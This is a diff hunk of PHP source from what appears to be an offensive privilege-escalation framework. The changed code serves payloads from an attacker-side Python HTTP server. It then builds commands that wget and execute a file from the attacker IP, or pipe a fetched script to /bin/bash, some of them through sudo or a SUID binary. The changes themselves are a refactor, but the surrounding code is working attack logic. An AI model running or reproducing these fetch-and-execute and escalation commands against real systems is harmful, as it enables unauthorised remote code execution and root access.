@@ -2134,10 +2134,10 @@ EOC;
                     $query = "echo \"$via_suid -c $cmd\" > $this->dir_tmp/$sha1_cmd.sh  ";
                     $query = "echo \"sudo $via_suid -c id\" > $this->dir_tmp/$sha1_cmd.sh  ";
                     $this->requette($query);
-                    $attacker_ip = $this->ip4addr4target($target_ip);
-	                $open_server = "cd $this->dir_tmp; python -m SimpleHTTPServer $this->port_rfi"; $this->cmd("localhost",$open_server );
-	                if (!$this->tcp2open($attacker_ip, $this->port_rfi)) {$this->rouge($open_server);sleep(20);}
-	                
+
+	                $attacker_ip = $this->ip4addr4target($this->ip);
+                    $this->tcp2open4server($attacker_ip, $this->port_rfi);
+	               
 	                //$data = "($this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh) | /bin/bash ";
 	                //$data_sudo = "($via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh) | /bin/bash > /tmp/rst3.txt ; cat /tmp/rst3.txt";	                
 	                //$data_sudo = "bash -p <($via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh) > /tmp/rst.txt ; cat /tmp/rst.txt ";
@@ -2760,7 +2760,9 @@ sh X sh X $cmd ";
 	                if (!file_exists($file_path)) $this->requette($query);
 	                else $this->cmd($attacker_ip,$query);
 	                
-	                $this->tcp2open4server($attacker_ip,$this->port_rfi);
+	               
+	                $this->tcp2open4server($attacker_ip, $this->port_rfi);
+	                
 	                $data = "wget http://$attacker_ip:$this->port_rfi/$file_path -o ./$sha1_hash.exe ; echo '%ID%' > /tmp/req.txt ;$this->file_path ./$sha1_hash.exe <  /tmp/req.txt";
 	                $data_sudo = "wget http://$attacker_ip:$this->port_rfi/$file_path -o ./$sha1_hash.exe ; echo '%ID%' > /tmp/req.txt ;$via_sudo $this->file_path ./$sha1_hash.exe <  /tmp/req.txt ";
 	                break ;
